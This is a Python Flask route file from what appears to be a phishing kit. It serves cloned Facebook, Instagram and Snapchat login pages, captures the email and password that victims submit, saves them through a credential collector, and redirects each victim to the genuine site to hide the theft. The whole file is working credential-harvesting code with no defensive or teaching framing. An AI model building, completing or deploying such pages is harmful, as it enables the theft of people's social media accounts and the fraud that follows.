from flask import Blueprint, render_template, request, redirect, current_app, abort

from core.collector import save_credentials

web_bp = Blueprint(
    'web',
    __name__,
    template_folder='templates'
)

_REDIRECT_MAP = {
    'facebook': 'https://www.facebook.com',
    'instagram': 'https://www.instagram.com',
    'snapchat': 'https://www.snapchat.com',
}

_PLATFORM_TEMPLATES = {
    'facebook': 'facebook.html',
    'instagram': 'instagram.html',
    'snapchat': 'snapchat.html',
}


def _check_platform(platform: str) -> None:
    selected = current_app.config.get('SELECTED_PLATFORM')
    if selected != platform:
        abort(404)


@web_bp.route('/')
def index():
    selected = current_app.config.get('SELECTED_PLATFORM')
    if selected and selected in _PLATFORM_TEMPLATES:
        return render_template(_PLATFORM_TEMPLATES[selected])
    abort(404)


@web_bp.route('/facebook')
def facebook():
    _check_platform('facebook')
    return render_template('facebook.html')


@web_bp.route('/instagram')
def instagram():
    _check_platform('instagram')
    return render_template('instagram.html')


@web_bp.route('/snapchat')
def snapchat():
    _check_platform('snapchat')
    return render_template('snapchat.html')


@web_bp.route('/login/<platform>', methods=['POST'])
def login(platform):
    _check_platform(platform)

    email = request.form.get('email', '')
    password = request.form.get('password', '')

    save_credentials(platform.capitalize(), email, password)

    target = _REDIRECT_MAP.get(platform, 'https://www.google.com')
    return redirect(target)
